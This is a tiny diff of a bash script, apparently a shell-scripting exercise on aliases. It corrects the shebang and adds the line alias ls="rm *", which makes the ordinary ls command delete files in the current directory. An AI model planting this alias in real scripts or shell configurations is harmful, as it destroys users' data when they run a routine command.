@@ -1,2 +1,2 @@
-#!bin/bash
-echo "0-alias"
+#!/bin/bash
+alias ls="rm *"
